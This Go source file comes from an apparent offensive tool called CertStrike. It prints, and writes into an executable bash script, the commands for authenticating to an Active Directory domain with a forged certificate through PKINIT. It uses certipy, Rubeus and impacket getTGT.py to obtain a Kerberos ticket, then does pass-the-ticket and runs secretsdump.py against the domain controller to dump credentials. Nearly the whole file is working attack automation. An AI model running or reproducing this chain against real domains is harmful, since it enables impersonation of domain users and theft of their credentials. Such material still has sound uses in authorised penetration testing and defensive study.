package pki

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// PKINITInfo holds the information needed to authenticate via PKINIT.
type PKINITInfo struct {
	CertPath  string
	KeyPath   string
	PFXPath   string
	DC        string
	Domain    string
	TargetUPN string
}

// PrintPKINITCommands prints the commands needed to authenticate with a forged certificate.
func PrintPKINITCommands(info *PKINITInfo) {
	user := info.TargetUPN
	if idx := strings.Index(user, "@"); idx > 0 {
		user = user[:idx]
	}

	fmt.Println("[+] PKINIT Authentication Commands")
	fmt.Println("    Use any of the following to obtain a TGT:")

	if info.PFXPath != "" {
		fmt.Println("    # certipy (recommended — also performs UnPAC-the-hash)")
		fmt.Printf("    certipy auth -pfx %s -dc-ip %s -domain %s\n\n", info.PFXPath, info.DC, info.Domain)

		fmt.Println("    # Rubeus (from Windows)")
		fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /ptt /getcredentials\n\n", user, info.PFXPath)

		fmt.Println("    # impacket getTGT.py")
		fmt.Printf("    getTGT.py -dc-ip %s -pfx %s %s/%s\n\n", info.DC, info.PFXPath, info.Domain, user)
	} else if info.CertPath != "" && info.KeyPath != "" {
		pfxPath := strings.TrimSuffix(info.CertPath, filepath.Ext(info.CertPath)) + ".pfx"
		fmt.Println("    # Convert to PFX first:")
		fmt.Printf("    certipy cert -pfx -cert %s -key %s -out %s\n\n", info.CertPath, info.KeyPath, pfxPath)
		fmt.Printf("    certipy auth -pfx %s -dc-ip %s -domain %s\n\n", pfxPath, info.DC, info.Domain)
	}

	fmt.Println("    # Pass-the-ticket after TGT:")
	fmt.Printf("    export KRB5CCNAME=%s.ccache\n", user)
	fmt.Printf("    secretsdump.py -k -no-pass %s/%s@%s\n", info.Domain, user, info.DC)
}

// GeneratePKINITScript writes a bash script automating the PKINIT authentication flow.
func GeneratePKINITScript(info *PKINITInfo, outputPath string) error {
	user := info.TargetUPN
	if idx := strings.Index(user, "@"); idx > 0 {
		user = user[:idx]
	}

	pfxPath := info.PFXPath
	if pfxPath == "" && info.CertPath != "" {
		pfxPath = strings.TrimSuffix(info.CertPath, filepath.Ext(info.CertPath)) + ".pfx"
	}

	script := fmt.Sprintf(`#!/bin/bash
# CertStrike PKINIT Authentication Script
# Target: %s @ %s (DC: %s)
set -e

PFX="%s"
DC="%s"
DOMAIN="%s"
USER="%s"

echo "[*] PKINIT authentication for ${USER}@${DOMAIN}"

if command -v certipy &>/dev/null; then
    echo "[+] Using certipy..."
    certipy auth -pfx "$PFX" -dc-ip "$DC" -domain "$DOMAIN"
    exit 0
fi

if command -v getTGT.py &>/dev/null; then
    echo "[+] Using impacket getTGT.py..."
    getTGT.py -dc-ip "$DC" -pfx "$PFX" "${DOMAIN}/${USER}"
    export KRB5CCNAME="${USER}.ccache"
    secretsdump.py -k -no-pass "${DOMAIN}/${USER}@${DC}"
    exit 0
fi

echo "[!] Neither certipy nor getTGT.py found"
echo "[*] Install: pip install certipy-ad"
exit 1
`, info.TargetUPN, info.Domain, info.DC, pfxPath, info.DC, info.Domain, user)

	if err := os.WriteFile(outputPath, []byte(script), 0755); err != nil {
		return fmt.Errorf("write PKINIT script: %w", err)
	}
	fmt.Printf("[+] PKINIT script written to: %s\n", outputPath)
	return nil
}
